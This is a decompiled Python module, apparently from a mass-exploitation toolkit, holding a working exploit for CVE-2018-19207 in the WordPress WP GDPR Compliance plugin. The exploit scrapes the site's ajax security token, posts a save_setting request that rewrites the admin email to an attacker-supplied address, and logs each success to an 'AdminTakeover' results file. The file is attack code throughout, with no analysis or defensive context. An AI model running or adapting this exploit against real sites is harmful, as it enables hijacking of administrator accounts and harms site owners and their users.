# uncompyle6 version 2.11.5
# Python bytecode 2.7 (62211)
# Decompiled from: Python 2.7.18 (default, Apr 20 2020, 20:30:41) 
# [GCC 9.3.0]
# Embedded file name: Exploits\CVE_2018_19207wp_gdpr_compliance.py
import requests
import re
import json
from Exploits import printModule
r = '\x1b[31m'
g = '\x1b[32m'
y = '\x1b[33m'
b = '\x1b[34m'
m = '\x1b[35m'
c = '\x1b[36m'
w = '\x1b[37m'
Headers = {'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:28.0) Gecko/20100101 Firefox/28.0'}

def Exploit(site, email):
    try:
        Ex1 = 'http://' + site + '/wp-admin/admin-ajax.php'
        headers = {'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:28.0) Gecko/20100101 Firefox/28.0'}
        GET = requests.get('http://' + site, headers=headers, timeout=10)
        AjaxTokEN = re.findall('"ajaxSecurity":"(.*)"', str(GET.content))[0]
        payload = {'action': 'wpgdprc_process_action','security': str(AjaxTokEN)}
        payload['data'] = json.dumps({'type': 'save_setting',
           'append': False,
           'option': 'new_admin_email',
           'value': email
           })
        GG = requests.post(Ex1, timeout=10, headers=headers, data=payload)
        if '{"message":"","error":""}' in str(GG.content):
            with open('result/AdminTakeover_results.txt', 'a') as writer:
                writer.write(site + '/wp-login.php --> reset Link Sended to: {}\n------------------------------------------\n'.format(email))
            return printModule.returnYes(site, 'CVE-2018-19207', 'WP GDPR Compliance', 'Wordpress')
        return printModule.returnNo(site, 'CVE-2018-19207', 'WP GDPR Compliance', 'Wordpress')
    except:
        return printModule.returnNo(site, 'CVE-2018-19207', 'WP GDPR Compliance', 'Wordpress')